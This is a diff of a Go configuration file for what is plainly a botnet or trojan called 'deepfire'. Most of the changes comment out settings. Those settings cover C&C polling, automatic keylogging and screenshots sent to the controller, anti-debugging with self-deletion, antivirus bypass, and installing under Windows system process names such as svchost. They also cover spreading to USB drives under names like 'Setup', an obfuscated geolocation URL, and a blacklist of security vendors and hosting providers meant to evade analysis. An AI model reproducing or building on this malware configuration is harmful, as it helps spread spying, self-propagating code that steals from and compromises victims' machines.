@@ -1,7 +1,6 @@
 package deepfire
 
 import (
-	"os"
 	"syscall"
 )
 
@@ -35,14 +34,14 @@ var (
 	//============================================================
 	//                   Basic Variables
 	//============================================================
-	useSSL                bool   = true                                   //Use SSL Connections? Make sure the Panel URLS are https://
-	sslInsecureSkipVerify bool   = true                                   //Use Insecure SSL Certs? AKA Self-signed (Not Recomended)
-	userAgentKey          string = "d5900619da0c8a72e569e88027cd9490"     //Useragent for the panel to check to see if its a bot, change me to the one in the servers settings
-	checkEveryMin         int    = 10                                     //Min Time (Seconds) to check for commands
-	checkEveryMax         int    = 45                                     //Max Time (Seconds) to check for commands (Must be more then Min)
-	instanceKey           string = "80202e73-067f-4b4c-93f8-d738d1f77f69" //
-	installMe             bool   = true                                   //Should the bot install into system?
-	installNames                 = [...]string{                           //Names for the Bot
+	//useSSL                bool   = true                                   //Use SSL Connections? Make sure the Panel URLS are https://
+	//sslInsecureSkipVerify bool   = true                                   //Use Insecure SSL Certs? AKA Self-signed (Not Recomended)
+	//userAgentKey          string = "d5900619da0c8a72e569e88027cd9490"     //Useragent for the panel to check to see if its a bot, change me to the one in the servers settings
+	//checkEveryMin         int    = 10                                     //Min Time (Seconds) to check for commands
+	//checkEveryMax         int    = 45                                     //Max Time (Seconds) to check for commands (Must be more then Min)
+	//instanceKey           string = "80202e73-067f-4b4c-93f8-d738d1f77f69" //
+	//installMe             bool   = true                                   //Should the bot install into system?
+	installNames = [...]string{ //Names for the Bot
 		"svchost",
 		"csrss",
 		"rundll32",
@@ -80,34 +79,34 @@ var (
 	//============================================================
 	//                   Optional Variables
 	//============================================================
-	clientVersion          string = "ArchDuke"                                                                                         //Bot Version
-	antiDebug              bool   = false                                                                                              //Anti-Debug Programs
-	debugReaction          int    = 1                                                                                                  // How to react to debug programs, 0 = Self Delete, 1 = Exit, 2 = Loop doing nothing
-	activeDefense          bool   = true                                                                                               //Use Active defense
-	watchdogName           string = "ServiceHelper"                                                                                    //Name of the WatchDog program
-	antiProcess            bool   = false                                                                                              //Run Anti-Process on run
-	autoScreenShot         bool   = true                                                                                               //Auto send a new Screen Shot to C&C
-	autoScreenShotInterval int    = 15                                                                                                 //Minutes to wait between each SS
-	sleepOnRun             bool   = false                                                                                              //Enable to sleep before loading config/starting
-	sleepOnRunTime         int    = 5                                                                                                  //Seconds to sleep before starting (helps bypass AV)
-	editHosts              bool   = false                                                                                              //Edit the HOST file on lounch to preset settings
-	antiVirusBypass        bool   = false                                                                                              //Helps hide from Anti-Virus Programs
-	procBlacklist          bool   = false                                                                                              //Process names to exit if detected
-	autoKeylogger          bool   = true                                                                                               //Run keylogger automaticly on bot startup
-	autoKeyloggerInterval  int    = 10                                                                                                 //Minutes to wait to send keylogs to C&C
-	autoReverseProxy       bool   = false                                                                                              //To run the Reverse Proxy Server on startup
-	reverseProxyPort       string = "8080"                                                                                             //Normal Port to run the server on
-	reverseProxyBackend    string = "127.0.0.1:6060"                                                                                   //Backends to send proxyed data too. Supports Multi (127.0.0.1:8080,127.0.0.1:8181,....)
-	startUpError           bool   = false                                                                                              //Shows an Error message on startup
-	startUpErrorTitle      string = "Error"                                                                                            //Title of Error Message
-	startUpErrorText       string = "This Programm is not a valid Win32 Application!"                                                  //Text of Error Message
-	checkIP                       = [...]string{"http://checkip.amazonaws.com", "http://myip.dnsdynamic.org", "http://ip.dnsexit.com"} //$_SERVER['REMOTE_ADDR']
-	maxMind                string = deobfuscate("iuuqt;00xxx/nbynjoe/dpn0hfpjq0w3/20djuz0nf")                                          //Gets IP information
-	uTorrnetURL            string = "http://download.ap.bittorrent.com/track/stable/endpoint/utorrent/os/windows"                      //URL to download uTorrent from
+	//clientVersion          string = "ArchDuke"                                                                                         //Bot Version
+	//antiDebug              bool   = false                                                                                              //Anti-Debug Programs
+	//debugReaction          int    = 1                                                                                                  // How to react to debug programs, 0 = Self Delete, 1 = Exit, 2 = Loop doing nothing
+	//activeDefense          bool   = true                                                                                               //Use Active defense
+	//watchdogName           string = "ServiceHelper"                                                                                    //Name of the WatchDog program
+	//antiProcess            bool   = false                                                                                              //Run Anti-Process on run
+	//autoScreenShot         bool   = true                                                                                               //Auto send a new Screen Shot to C&C
+	//autoScreenShotInterval int    = 15                                                                                                 //Minutes to wait between each SS
+	//sleepOnRun             bool   = false                                                                                              //Enable to sleep before loading config/starting
+	//sleepOnRunTime         int    = 5                                                                                                  //Seconds to sleep before starting (helps bypass AV)
+	//editHosts              bool   = false                                                                                              //Edit the HOST file on lounch to preset settings
+	//antiVirusBypass        bool   = false                                                                                              //Helps hide from Anti-Virus Programs
+	//procBlacklist          bool   = false                                                                                              //Process names to exit if detected
+	//autoKeylogger          bool   = true                                                                                               //Run keylogger automaticly on bot startup
+	//autoKeyloggerInterval  int    = 10                                                                                                 //Minutes to wait to send keylogs to C&C
+	//autoReverseProxy       bool   = false                                                                                              //To run the Reverse Proxy Server on startup
+	//reverseProxyPort       string = "8080"                                                                                             //Normal Port to run the server on
+	//reverseProxyBackend    string = "127.0.0.1:6060"                                                                                   //Backends to send proxyed data too. Supports Multi (127.0.0.1:8080,127.0.0.1:8181,....)
+	//startUpError           bool   = false                                                                                              //Shows an Error message on startup
+	//startUpErrorTitle      string = "Error"                                                                                            //Title of Error Message
+	//startUpErrorText       string = "This Programm is not a valid Win32 Application!"                                                  //Text of Error Message
+	//checkIP                       = [...]string{"http://checkip.amazonaws.com", "http://myip.dnsdynamic.org", "http://ip.dnsexit.com"} //$_SERVER['REMOTE_ADDR']
+	//maxMind                string = deobfuscate("iuuqt;00xxx/nbynjoe/dpn0hfpjq0w3/20djuz0nf")                                          //Gets IP information
+	//uTorrnetURL            string = "http://download.ap.bittorrent.com/track/stable/endpoint/utorrent/os/windows"                      //URL to download uTorrent from
 	//	xmrMinerURL          string = "https://ottrbutt.com/cpuminer-multi/minerd-wolf-07-09-14.exe"                                                                 //URL to the Miner.exe
-	tmpPath2    string = os.Getenv("APPDATA") + "\\" //APPDATA err, Roaming
-	winDirPath  string = os.Getenv("WINDIR") + "\\"  //Windows
-	rawHTMLPage string = "404 page not found"        //What the defult HTML for hosting will say.
+	//tmpPath2    string = os.Getenv("APPDATA") + "\\" //APPDATA err, Roaming
+	//winDirPath  string = os.Getenv("WINDIR") + "\\"  //Windows
+	//rawHTMLPage string = "404 page not found"        //What the defult HTML for hosting will say.
 	//	binderMark           string = "-00800-"                                                                                                                      //To check if the files been infected by this bot
 	driveNames     = [...]string{"A", "B", "D", "E", "F", "G", "H", "I", "J", "X", "Y", "Z"} //Drive Letters to Spread too, USB mainly.
 	spreadNames    = [...]string{"USBDriver", "Installer", "Setup", "Install"}               //Names for the bot to spread under
@@ -154,47 +153,47 @@ var (
 		"United Kingdom", "Finland", "Russia", "Germany", "Israel",
 		"South Korea", "Japan", "South Africa",
 	}
-	organizationBlacklist = [...]string{ //Organizations that do testing/Debugging/Anti-Virus work
-		/*	"Amazon",
-			"anonymous",
-			"BitDefender",
-			"BlackOakComputers",
-			"Blue Coat",
-			"BlueCoat",
-			"Cisco",
-			"cloud",
-			"Data Center",
-			"DataCenter",
-			"DataCentre",
-			"dedicated",
-			"ESET, Spol",
-			"FireEye",
-			"ForcePoint",
-			"Fortinet",
-			"Hetzner",
-			"hispeed.ch",
-			"hosted",
-			"Hosting",
-			"Iron Port",
-			"IronPort",
-			"LeaseWeb",
-			"MessageLabs",
-			"Microsoft",
-			"MimeCast",
-			"NForce",
-			"Ovh Sas",
-			"Palo Alto",
-			"ProofPoint",
-			"Rackspace",
-			"security",
-			"Server",
-			"Strong Technologies",
-			"Trend Micro",
-			"TrendMicro",
-			"TrustWave",
-			"VMVault",
-			"Zscaler",*/
-	}
+	//organizationBlacklist = [...]string{ //Organizations that do testing/Debugging/Anti-Virus work
+	/*	"Amazon",
+		"anonymous",
+		"BitDefender",
+		"BlackOakComputers",
+		"Blue Coat",
+		"BlueCoat",
+		"Cisco",
+		"cloud",
+		"Data Center",
+		"DataCenter",
+		"DataCentre",
+		"dedicated",
+		"ESET, Spol",
+		"FireEye",
+		"ForcePoint",
+		"Fortinet",
+		"Hetzner",
+		"hispeed.ch",
+		"hosted",
+		"Hosting",
+		"Iron Port",
+		"IronPort",
+		"LeaseWeb",
+		"MessageLabs",
+		"Microsoft",
+		"MimeCast",
+		"NForce",
+		"Ovh Sas",
+		"Palo Alto",
+		"ProofPoint",
+		"Rackspace",
+		"security",
+		"Server",
+		"Strong Technologies",
+		"Trend Micro",
+		"TrendMicro",
+		"TrustWave",
+		"VMVault",
+		"Zscaler",*/
+	//}
 
 	//============================================================
 	//                   Dont Touch Bellow
